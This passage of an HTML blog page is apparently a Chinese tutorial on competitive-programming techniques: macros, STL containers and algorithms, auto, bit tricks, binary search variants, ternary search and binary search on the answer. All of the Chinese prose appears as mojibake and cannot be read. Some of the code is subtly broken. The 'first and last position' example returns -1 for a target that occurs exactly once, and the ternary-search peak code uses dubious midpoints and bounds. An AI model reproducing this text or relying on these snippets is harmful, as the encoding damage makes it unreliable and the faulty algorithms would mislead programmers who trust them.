é‡"></a>2.<strong>ä½¿ç”¨å®å®šä¹‰å‡å°‘ä»£ç é‡</strong></h4><p>å®å¯ä»¥ç”¨äºå‡å°‘è¾“å…¥è¾“å‡ºã€å¸¸ç”¨ç®—æ³•æˆ–è€…å¸¸ç”¨æ•°æ®ç»“æ„çš„ä»£ç é‡ã€‚è™½ç„¶å®å®šä¹‰è¿‡å¤šå¯èƒ½å½±å“ä»£ç çš„å¯è¯»æ€§ï¼Œä½†åœ¨ç«èµ›ä¸­å¯ä»¥å¸®åŠ©ä½ å¿«é€Ÿç¼–å†™ä»£ç ã€‚</p><h4 id="3-ä½¿ç”¨-STL-ç®€åŒ–æ“ä½œ"><a href="#3-ä½¿ç”¨-STL-ç®€åŒ–æ“ä½œ" class="headerlink" title="3. ä½¿ç”¨ STL ç®€åŒ–æ“ä½œ"></a>3. <strong>ä½¿ç”¨ STL ç®€åŒ–æ“ä½œ</strong></h4><p>C++ æ ‡å‡†æ¨¡æ¿åº“ï¼ˆSTLï¼‰æä¾›äº†ä¸°å¯Œçš„å®¹å™¨å’Œç®—æ³•ï¼Œå¯ä»¥å¤§å¹…å‡å°‘ä»£ç é‡å’Œå¼€å‘æ—¶é—´ã€‚åœ¨ç«èµ›ä¸­å¸¸ç”¨çš„æœ‰ï¼š</p><p><strong><code>std::vector</code> å’Œ <code>std::pair</code></strong></p><ul><li><code>vector</code> æ˜¯åŠ¨æ€æ•°ç»„ï¼Œéå¸¸é€‚åˆå­˜å‚¨å¤§è§„æ¨¡æ•°æ®ã€‚</li><li><code>pair</code> ç”¨äºå­˜å‚¨ä¸¤ä¸ªç›¸å…³è”çš„å€¼ï¼Œå¸¸ç”¨äºæ’åºå’Œå­˜å‚¨åæ ‡ã€é”®å€¼å¯¹ç­‰ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; vp = &#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">5</span>&#125;, &#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">4</span>, <span class="hljs-number">2</span>&#125;&#125;;<br>    <br>    <span class="hljs-comment">// ä½¿ç”¨sortå¯¹pairè¿›è¡Œæ’åºï¼ŒæŒ‰ç…§firstæ’åº</span><br>    sort(vp.begin(), vp.end());<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> p : vp) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; p.first &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; p.second &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¸¸ç”¨ STL å‡½æ•°ï¼š<code>sort</code>ã€<code>max_element</code>ã€<code>min_element</code></strong></p><p>ä½¿ç”¨ STL æä¾›çš„ç®—æ³•åº“ï¼Œå¦‚ <code>sort</code>ã€<code>max_element</code> ç­‰ï¼Œå¯ä»¥å¿«é€Ÿå®ç°æ’åºå’Œæœ€å¤§æœ€å°å€¼çš„æŸ¥æ‰¾ï¼Œé¿å…æ‰‹åŠ¨å®ç°ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-meta">#include &lt;iostream&gt;</span><br><span class="hljs-meta">#include &lt;vector&gt;</span><br><span class="hljs-meta">#include &lt;algorithm&gt;</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-title">std</span>;<br><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">main</span>()</span> &#123;<br>    vector&lt;<span class="hljs-built_in">int</span>&gt; v = &#123;<span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;;<br><br>    <span class="hljs-comment">// å¿«é€Ÿæ’åº</span><br>    sort(v.begin(), v.end());<br><br>    <span class="hljs-comment">// æŸ¥æ‰¾æœ€å¤§å€¼å’Œæœ€å°å€¼</span><br>    <span class="hljs-built_in">int</span> maxVal = *max_element(v.begin(), v.end());<br>    <span class="hljs-built_in">int</span> minVal = *min_element(v.begin(), v.end());<br><br>    cout &lt;&lt; <span class="hljs-string">&quot;Max: &quot;</span> &lt;&lt; maxVal &lt;&lt; <span class="hljs-string">&quot;, Min: &quot;</span> &lt;&lt; minVal &lt;&lt; endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-ä½¿ç”¨-auto-å‡å°‘å†—é•¿çš„ç±»å‹å£°æ˜"><a href="#4-ä½¿ç”¨-auto-å‡å°‘å†—é•¿çš„ç±»å‹å£°æ˜" class="headerlink" title="4. ä½¿ç”¨ auto å‡å°‘å†—é•¿çš„ç±»å‹å£°æ˜"></a>4. <strong>ä½¿ç”¨ <code>auto</code> å‡å°‘å†—é•¿çš„ç±»å‹å£°æ˜</strong></h4><p><code>auto</code> å…³é”®å­—å…è®¸ç¼–è¯‘å™¨è‡ªåŠ¨æ¨å¯¼å˜é‡ç±»å‹ï¼Œç‰¹åˆ«æ˜¯åœ¨ä½¿ç”¨å¤æ‚çš„ STL å®¹å™¨æ—¶ï¼Œå®ƒå¯ä»¥æ˜¾è‘—å‡å°‘ä»£ç çš„é•¿åº¦å’Œå¤æ‚æ€§ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">auto</span> vec = vector&lt;<span class="hljs-type">int</span>&gt;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;  <span class="hljs-comment">// è‡ªåŠ¨æ¨å¯¼ç±»å‹</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i : vec) &#123;<br>        cout &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// è¾“å‡º 1 2 3</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5-ä½æ“ä½œä¼˜åŒ–"><a href="#5-ä½æ“ä½œä¼˜åŒ–" class="headerlink" title="5. ä½æ“ä½œä¼˜åŒ–"></a>5. <strong>ä½æ“ä½œä¼˜åŒ–</strong></h4><p>ä½æ“ä½œæ˜¯éå¸¸é«˜æ•ˆçš„æ“ä½œï¼Œå®ƒèƒ½è®©å¾ˆå¤šç®—æ³•åœ¨å¸¸æ•°æ—¶é—´å†…å®Œæˆæ“ä½œã€‚å¸¸è§çš„åº”ç”¨åŒ…æ‹¬åˆ¤æ–­å¥‡å¶æ€§ã€äº¤æ¢æ•°å€¼ã€ä½æ©ç æ“ä½œç­‰ã€‚</p><p><strong>å¸¸è§çš„ä½æ“ä½œæŠ€å·§</strong>ï¼š</p><ul><li><p><strong>åˆ¤æ–­å¥‡å¶</strong>ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isOdd</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> n &amp; <span class="hljs-number">1</span>;  <span class="hljs-comment">// å¦‚æœ n çš„æœ€ä½ä½æ˜¯ 1 åˆ™ä¸ºå¥‡æ•°ï¼Œå¦åˆ™ä¸ºå¶æ•°</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>äº¤æ¢ä¸¤ä¸ªæ•°</strong>ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-type">int</span> &amp;a, <span class="hljs-type">int</span> &amp;b)</span> </span>&#123;<br>    a = a ^ b;<br>    b = a ^ b;<br>    a = a ^ b;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>å¿«é€Ÿè®¡ç®— 2 çš„å¹‚</strong>ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPowerOfTwo</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (n &gt; <span class="hljs-number">0</span>) &amp;&amp; (n &amp; (n - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>;  <span class="hljs-comment">// n æ˜¯ 2 çš„å¹‚æ—¶ï¼Œå…¶äºŒè¿›åˆ¶ä¸­åªæœ‰ä¸€ä¸ª 1</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><hr><h2 id="ä¸€-äºŒåˆ†"><a href="#ä¸€-äºŒåˆ†" class="headerlink" title="ä¸€.äºŒåˆ†"></a>ä¸€.äºŒåˆ†</h2><h3 id="äºŒåˆ†æŸ¥æ‰¾çš„åŸºæœ¬å®ç°ï¼š"><a href="#äºŒåˆ†æŸ¥æ‰¾çš„åŸºæœ¬å®ç°ï¼š" class="headerlink" title="äºŒåˆ†æŸ¥æ‰¾çš„åŸºæœ¬å®ç°ï¼š"></a><strong>äºŒåˆ†æŸ¥æ‰¾çš„åŸºæœ¬å®ç°</strong>ï¼š</h3><p>äºŒåˆ†æŸ¥æ‰¾ç”¨äºåœ¨æœ‰åºæ•°ç»„ä¸­æŸ¥æ‰¾ç›®æ ‡å€¼ <code>target</code>ï¼Œå…¶æ—¶é—´å¤æ‚åº¦ä¸º O(log n)ã€‚</p><p>è¦æ±‚éœ€è¦æœ‰åºçš„æ•°ç»„</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = n - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (left &lt;= right) &#123;<br>    <span class="hljs-type">int</span> mid = (left + right) / <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (array[mid] == target)<br>        <span class="hljs-keyword">return</span> mid;  <span class="hljs-comment">// æ‰¾åˆ°ç›®æ ‡ï¼Œè¿”å›ç´¢å¼•</span><br>    <span class="hljs-keyword">if</span> (array[mid] &lt; target)<br>        left = mid + <span class="hljs-number">1</span>;  <span class="hljs-comment">// ç›®æ ‡åœ¨å³è¾¹</span><br>    <span class="hljs-keyword">else</span><br>        right = mid - <span class="hljs-number">1</span>;  <span class="hljs-comment">// ç›®æ ‡åœ¨å·¦è¾¹</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">// æ²¡æœ‰æ‰¾åˆ°ç›®æ ‡ï¼Œè¿”å› -1</span><br></code></pre></td></tr></table></figure><p>é€‚ç”¨æ›´å¹¿çš„å‰é©±å‹â€”â€”æ‰¾æœ€åä¸€ä¸ª &lt;&#x3D; <code>target</code> çš„å…ƒç´ çš„ä½ç½®</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> left = <span class="hljs-number">-1</span>, right = n<span class="hljs-number">-1</span>;<br><span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>    <span class="hljs-type">int</span> mid = (left + right + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>;  <span class="hljs-comment">//å‘ä¸Šå–æ•´</span><br>    <span class="hljs-keyword">if</span> (array[mid] &lt;= target)  <span class="hljs-comment">// array[mid] &gt; targetæ­¤å¤–ä¹Ÿå¯ä»¥å†™åˆ«çš„æ¡ä»¶ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦çš„ç­”æ¡ˆçš„åŸºæœ¬æ€§è´¨</span><br>        left = mid;<br>    <span class="hljs-keyword">else</span><br>        right = mid - <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> left + <span class="hljs-number">1</span>; <span class="hljs-comment">// ä¸å®‰å…¨è¿”å›n</span><br></code></pre></td></tr></table></figure><p>é€‚ç”¨æ›´å¹¿çš„åç»§å‹â€”â€”â€”æ‰¾ç¬¬ä¸€ä¸ª &gt;&#x3D; target çš„æ•°ä¸å­˜åœ¨</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-type">int</span> mid)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (array[mid] &gt;= target) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å¦‚æœå¤§äºç­‰äºç›®æ ‡å€¼ï¼Œè¿”å›true</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">binary_search_upper_bound</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = n;  <br>    <span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>        <span class="hljs-type">int</span> mid = (left + right) &gt;&gt; <span class="hljs-number">1</span>;  <br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">check</span>(mid))  <br>            right = mid;  <br>        <span class="hljs-keyword">else</span><br>            left = mid + <span class="hljs-number">1</span>;  <br>    &#125;<br>    <span class="hljs-keyword">return</span> left;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>äºŒåˆ†æŸ¥æ‰¾çš„â€œä¸‰æ­¥èµ°â€</strong>ï¼š</p><ul><li><strong>æ­¥éª¤ 1</strong>ï¼šå†™å‡ºäºŒåˆ†çš„æ¡ä»¶ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªâ€œä¸ç­‰å¼â€æ¡ä»¶ã€‚ä¾‹å¦‚ï¼Œå¯¹äº <code>upper_bound</code> æŸ¥æ‰¾ï¼Œå¯ä»¥ç”¨â€œ<code>val</code> çš„æ•°ä¸­æœ€å°çš„â€è¿™ç§ä¸ç­‰å¼æ¡ä»¶ã€‚</li><li><strong>æ­¥éª¤ 2</strong>ï¼šå°†æ¡ä»¶æ”¾åˆ° <code>if</code> ä¸­ï¼Œå¹¶ç¡®å®šæ»¡è¶³æ¡ä»¶æ—¶éœ€è¦ç¼©å°å“ªä¸€åŠï¼ˆ<code>right = mid</code> è¿˜æ˜¯ <code>left = mid</code>ï¼‰ã€‚</li><li><strong>æ­¥éª¤ 3</strong>ï¼šå¦ä¸€åŠæ¡ä»¶æ”¾åœ¨ <code>else</code> ä¸­ã€‚é€šå¸¸å¯ä»¥æ˜¯ <code>left = mid + 1</code> æˆ– <code>right = mid - 1</code>ã€‚å¯¹äºå‘ä¸Šå–æ•´æˆ–å…¶ä»–æƒ…å†µå¯ä»¥è°ƒæ•´ <code>mid</code> è®¡ç®—æ–¹å¼ã€‚</li></ul><p><strong>è¾¹ç•Œå¤„ç†</strong>ï¼š</p><ul><li>å¦‚æœé¢˜ç›®å­˜åœ¨æ— è§£æƒ…å†µï¼Œå¯ä»¥åœ¨è¿”å›å€¼ä¸Šè°ƒæ•´ï¼Œæ¯”å¦‚ä¸Šç•Œå¢åŠ  1 æˆ–ä¸‹ç•Œå‡å°‘ 1ï¼Œä»¥è¡¨ç¤ºæ²¡æœ‰æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„å€¼ã€‚</li></ul><hr><h4 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><h5 id="å¯»æ‰¾æ—‹è½¬æ’åºæ•°ç»„ä¸­çš„æœ€å°å€¼"><a href="#å¯»æ‰¾æ—‹è½¬æ’åºæ•°ç»„ä¸­çš„æœ€å°å€¼" class="headerlink" title="å¯»æ‰¾æ—‹è½¬æ’åºæ•°ç»„ä¸­çš„æœ€å°å€¼"></a>å¯»æ‰¾æ—‹è½¬æ’åºæ•°ç»„ä¸­çš„æœ€å°å€¼</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findMin</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>    <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>        <span class="hljs-type">int</span> mid = (left + right) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (nums[mid] &lt;= nums[right])<br>            right = mid;<br>        <span class="hljs-keyword">else</span><br>            left = mid + <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> nums[right];<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="åœ¨æ’åºæ•°ç»„ä¸­æŸ¥æ‰¾å…ƒç´ çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªä½ç½®"><a href="#åœ¨æ’åºæ•°ç»„ä¸­æŸ¥æ‰¾å…ƒç´ çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªä½ç½®" class="headerlink" title="åœ¨æ’åºæ•°ç»„ä¸­æŸ¥æ‰¾å…ƒç´ çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªä½ç½®"></a>åœ¨æ’åºæ•°ç»„ä¸­æŸ¥æ‰¾å…ƒç´ çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªä½ç½®</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; ans;<br><span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = nums.<span class="hljs-built_in">size</span>();<br><span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>    <span class="hljs-type">int</span> mid = (left + right) / <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (nums[mid] &gt;= target)  <span class="hljs-comment">// æŸ¥æ‰¾ä½ç½®ç¬¬ä¸€ä¸ª &gt;= target çš„æ•°</span><br>        right = mid;<br>    <span class="hljs-keyword">else</span><br>        left = mid + <span class="hljs-number">1</span>;<br>&#125;<br>ans.<span class="hljs-built_in">push_back</span>(right);<br><br>left = <span class="hljs-number">0</span>, right = nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>    <span class="hljs-type">int</span> mid = (left + right + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (nums[mid] &lt;= target)  <span class="hljs-comment">// æŸ¥æ‰¾ä½ç½®æœ€åä¸€ä¸ª &lt;= target çš„æ•°</span><br>        left = mid;<br>    <span class="hljs-keyword">else</span><br>        right = mid - <span class="hljs-number">1</span>;<br>&#125;<br>ans.<span class="hljs-built_in">push_back</span>(right);<br><br><span class="hljs-keyword">if</span> (ans[<span class="hljs-number">0</span>] == ans[<span class="hljs-number">1</span>]) <span class="hljs-keyword">return</span> &#123;<span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>&#125;;<br><span class="hljs-keyword">return</span> ans;<br></code></pre></td></tr></table></figure><h4 id="å®æ•°å¹³æ–¹æ ¹"><a href="#å®æ•°å¹³æ–¹æ ¹" class="headerlink" title="å®æ•°å¹³æ–¹æ ¹"></a>å®æ•°å¹³æ–¹æ ¹</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">myRealSqrt</span><span class="hljs-params">(<span class="hljs-type">double</span> x)</span> </span>&#123;<br>    <span class="hljs-type">double</span> left = <span class="hljs-number">0</span>, right = x;<br>    <span class="hljs-keyword">while</span> (right - left &gt; <span class="hljs-number">1e-7</span>) &#123; <span class="hljs-comment">//è¦æ±‚æ¯”ä¿ç•™å°æ•°å¤š2ï¼Œè¿™é‡Œå°±æ˜¯5ä½å°æ•°</span><br>        <span class="hljs-type">double</span> mid = (left + right) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (mid * mid &lt;= x) &#123;<br>            left = mid;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            right = mid;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> right;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¸‰åˆ†æŸ¥æ‰¾"><a href="#ä¸‰åˆ†æŸ¥æ‰¾" class="headerlink" title="ä¸‰åˆ†æŸ¥æ‰¾"></a>ä¸‰åˆ†æŸ¥æ‰¾</h3><p><strong>ç®—æ³•æ­¥éª¤</strong>ï¼š</p><ul><li><strong>æ¯”è¾ƒä¸¤ç‚¹</strong> <code>lmid</code> å’Œ <code>rmid</code> çš„å‡½æ•°å€¼ï¼š<ul><li>å¦‚æœ <code>f(lmid) &lt; f(rmid)</code>ï¼Œåˆ™æå€¼ä½äº <code>lmid</code> çš„å³è¾¹ï¼ˆæ’é™¤ <code>lmid</code> å·¦ä¾§åŒºé—´ï¼‰ï¼Œæ‰€ä»¥æ›´æ–°å·¦è¾¹ç•Œ <code>left = lmid + 1</code>ã€‚</li><li>å¦åˆ™ï¼Œæå€¼ä½äº <code>rmid</code> çš„å·¦è¾¹ï¼ˆæ’é™¤ <code>rmid</code> å³ä¾§åŒºé—´ï¼‰ï¼Œæ›´æ–°å³è¾¹ç•Œ <code>right = rmid - 1</code>ã€‚</li></ul></li><li>ä¸æ–­é‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œç›´åˆ°åŒºé—´æ”¶ç¼©åˆ°æå€¼ç‚¹ã€‚</li></ul><h4 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>    <span class="hljs-type">int</span> lmid = (left + right) / <span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> rmid = (lmid + right) / <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (nums[lmid] &lt;= nums[rmid]) <br>        left = lmid + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span> <br>        right = rmid - <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> right;<br><br></code></pre></td></tr></table></figure><p><strong>è§£é‡Š</strong>ï¼š</p><ul><li>è¯¥ç®—æ³•é€šè¿‡ä¸‰åˆ†æŸ¥æ‰¾ï¼Œé€æ¸ç¼©å°åŒºé—´ç›´åˆ°æ‰¾åˆ°æ•°ç»„çš„å³°å€¼ä½ç½®ã€‚</li><li>åœ¨å•å³°å‡½æ•°ä¸­ï¼Œè¿™ç§æ–¹æ³•èƒ½æœ‰æ•ˆæ‰¾åˆ°æå€¼ç‚¹ã€‚</li></ul><hr><h3 id="äºŒåˆ†ç­”æ¡ˆ"><a href="#äºŒåˆ†ç­”æ¡ˆ" class="headerlink" title="äºŒåˆ†ç­”æ¡ˆ"></a>äºŒåˆ†ç­”æ¡ˆ</h3><p>äºŒåˆ†ç­”æ¡ˆçš„æœ¬è´¨å•Šï¼Œå°±æ˜¯å»é€šè¿‡é¢˜ç›®ç»™çš„é™åˆ¶æ¡ä»¶ã€‚å»ºç«‹ä¸€ä¸ªå•è°ƒåˆ†æ®µï¼Œå»ºç«‹ä¸€ä¸ªå•è°ƒåˆ†æ®µï¼Œé›¶ä¸€å‡½æ•°å•Šï¼Œè¿™ä¸ªå‡½æ•°çš„ã€‚å®šä¹‰åŸŸæ˜¯è§£ç©ºé—´ï¼Œå°±ç­”æ¡ˆå€¼åŸŸæ˜¯é›¶æˆ–è€…ä¸€å°±æ˜¯æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°æœ¬èº«å…¶å®æ˜¯ã€‚å¯¹è¿™ä¸ªé™åˆ¶çš„ä¸€ä¸ªéªŒè¯å•Šï¼Œä¸€ä¸ªåˆ¤å®šã€‚é‚£ä¹ˆï¼Œé€šè¿‡è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨æ•´ä¸ªè§£ä¸Šï¼Œå¯¹å§ï¼Ÿè¿™ä¸ªã€‚ç©ºé—´é‡Œè¾¹å»äºŒåˆ†æŸ¥æ‰¾è¿™ä¸ªåˆ†çº¿ç‚¹åœ¨ä»€ä¹ˆåœ°æ–¹ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬è¦çš„ç­”æ¡ˆã€‚</p><h4 id="ä¾‹å­-1"><a 